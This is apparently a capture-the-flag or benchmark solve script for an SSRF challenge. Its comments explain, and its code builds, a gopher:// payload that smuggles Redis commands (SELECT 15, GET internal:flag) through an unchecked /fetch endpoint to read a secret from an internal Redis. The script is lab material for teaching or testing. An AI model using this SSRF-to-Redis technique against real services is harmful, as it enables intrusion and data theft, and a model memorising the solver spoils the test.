#!/usr/bin/env bash
# APEX-021-25 — "Redis Protocol Smuggling via SSRF" (tags: ssrf, gopher)
#
# `/fetch?url=` fetches whatever it is given, and the scheme is not checked, so
# `gopher://` turns the fetch into "open a TCP connection and write these
# bytes". Redis speaks a line protocol that tolerates being written at, so the
# bytes can be Redis commands: `SELECT` the database that holds the flag, `GET`
# the key, and the reply comes back through the same response the fetcher was
# built to show.
#
# The flag is at `internal:flag` in database 15, which is why the stream begins
# with a `SELECT`: a gopher payload is one connection, and a connection starts
# on database 0.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex021-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/api/info" --session "$SESSION" --new --capture >/dev/null
send "$SESSION" req_0 --create --set path=/debug/internal-hosts >/dev/null

# Inline commands, one per line: what Redis accepts from anything that can
# write to its port.
PAYLOAD="$(python3 -c '
import urllib.parse
commands = "SELECT 15\r\nGET internal:flag\r\nQUIT\r\n"
print("gopher://redis:6379/_" + urllib.parse.quote(commands, safe=""))
')"
send "$SESSION" req_0 --create --set path=/fetch --set "query.url=$PAYLOAD" | flag
